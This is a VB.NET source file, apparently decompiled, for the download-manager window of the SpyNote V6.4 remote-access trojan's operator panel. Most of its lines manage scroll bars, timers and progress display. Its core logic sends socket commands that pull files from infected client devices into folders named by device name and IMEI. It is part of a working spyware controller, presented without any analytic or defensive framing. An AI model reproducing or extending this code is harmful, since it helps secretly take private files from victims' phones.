Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.IO
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class DownloadManager
    Public imageList_0 As ImageList

    Public TClient As SocketClient

    Public DManagerClient As SocketClient

    Public _Stream As Integer

    Private x As Integer

    Private y As Integer

    Private inda As Boolean
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.inda = False
        Me.InitializeComponent()
    End Sub

    Private Sub aCancel_Click(ByVal sender As Object, ByVal e As EventArgs) Handles aCancel.Click
        MyBase.Close()
    End Sub

    Private Sub DManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles DManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub DManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DManager.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub DManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub DManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles DManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub DownloadManager_Closing(ByVal sender As Object, ByVal e As CancelEventArgs) Handles Me.Closing
        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(35)), SN.Data.SplitData))
        If (Me.DManagerClient IsNot Nothing) Then
            Me.DManagerClient.Close(False)
        End If
    End Sub

    Private Sub DownloadManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\18.ico"))
        Me.DManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(String.Concat(Store.Resources(1), "\Icons\FileManager\"))
        Dim strArrays As String() = files
        Dim num As Integer = 0
        While num < CInt(strArrays.Length)
            Dim str As String = strArrays(num)
            If (Not flag) Then
                Dim column1 As DataGridViewImageColumn = Me.Column1
                Dim size As System.Drawing.Size = Image.FromFile(str).Size
                column1.Width = size.Width
                Dim imageList0 As ImageList = Me.imageList_0
                size = Image.FromFile(str).Size
                Dim width As Integer = size.Width
                size = Image.FromFile(str).Size
                imageList0.ImageSize = New System.Drawing.Size(width, size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim fileNameWithoutExtension As String = Path.GetFileNameWithoutExtension(str)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(str))
            num = num + 1
        End While
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.DManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DManager.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.DManager.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DManager.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DManager.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DManager.Rows.Count * Me.DManager.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DManager.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.DManager
                If (Me.DManager.Rows.Count > 0) Then
                    If (Me.DManager.Rows.Count * Me.DManager.Rows(0).Height > Me.DManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.DManager.Height) / CDbl(Me.DManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.DManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Private Sub TCompletion_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TCompletion.Tick
        Try
            If (Me.TCompletion.Interval = 1) Then
                Me.TCompletion.Interval = 1000
            End If
            If (Me.TClient.FileSizeBytesDownloaded <= Me.TClient.TotalFileSize) Then
                If (Me.TClient.FileSizeBytesDownloaded > CLng(0)) Then
                    Me.TClient.stop_time = DateAndTime.Now
                    Me.TClient.elapsed_time = Me.TClient.stop_time.Subtract(Me.TClient.start_time)
                    Dim num As Long = CLng(Math.Round(CDbl((Me.TClient.TotalFileSize - Me.TClient.FileSizeBytesDownloaded)) * Me.TClient.elapsed_time.TotalSeconds / CDbl(Me.TClient.FileSizeBytesDownloaded)))
                    Dim time As String = Store.aToTime(num)
                    If (Operators.CompareString(time, "0:0:0", False) <> 0) Then
                        Me.inda = True
                        Me.expectedtime.Text = String.Concat("Time remaining ", time)
                        Dim now As System.DateTime = System.DateTime.Now
                        Dim dateTime As System.DateTime = Convert.ToDateTime(time)
                        now = now.AddHours(CDbl(dateTime.Hour))
                        now = now.AddMinutes(CDbl(dateTime.Minute))
                        now = now.AddSeconds(CDbl(dateTime.Second))
                        Me.Iwillfinishwhen.Text = String.Concat("Time left to Finish ", now.ToString("h:mm:ss"))
                        If (Not Me.PnlTime.Visible) Then
                            Me.PnlTime.Visible = True
                        End If
                    ElseIf (Me.PnlTime.Visible) Then
                        Me.PnlTime.Visible = False
                    End If
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TDownload_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TDownload.Tick
        Try
            If (Me.DManager.Rows.Count <= 0) Then
                Me.LabNameFile.Text = "Downloads Completed"
            ElseIf (Conversions.ToBoolean(Operators.AndObject(Operators.NotObject(Operators.CompareObjectEqual(Me.DManager.Rows(0).Cells(1).Tag, "go", False)), Operators.CompareObjectEqual(Me.DManager.Rows(0).Cells(1).Tag, Nothing, False)))) Then
                Me.DManager.Rows(0).Cells(1).Tag = "go"
                String.Concat(New String() {Store.Resources(1), "\Clients\", Me.TClient.ClientName, "_", Me.TClient.ClientImei, "\Downloads\", Conversions.ToString(Me.DManager.Rows(0).Cells(1).Value)})
                Dim str As String = Conversions.ToString(Me.DManager.Rows(0).Cells(3).Value)
                Me._Stream = 0
                Me.LabNameFile.Text = Conversions.ToString(Me.DManager.Rows(0).Cells(1).Value)
                Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(19)), SN.Data.SplitData, str))
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        Dim num As Integer
        Try
            num = If(Me.DManager.Rows.Count <= 0, 0, Store.RateConverter(Me._Stream, Conversions.ToInteger(Me.DManager.Rows(0).Cells(2).Tag)))
            Me.ProgressBar1.Value = num
        Catch exception As System.Exception
        End Try
        If (Me.DManagerClient IsNot Nothing) Then
            If (Me.DManagerClient.IsClose) Then
                If (Me.inda) Then
                    MyBase.Close()
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.DManager.HorizontalScrollingOffset <> -1) Then
                Me.DManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.DManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.DManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            If (Me.DManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.DManager.FirstDisplayedScrollingRowIndex = Me.DManager.RowCount - 1
            End If
        End Try
    End Sub
End Class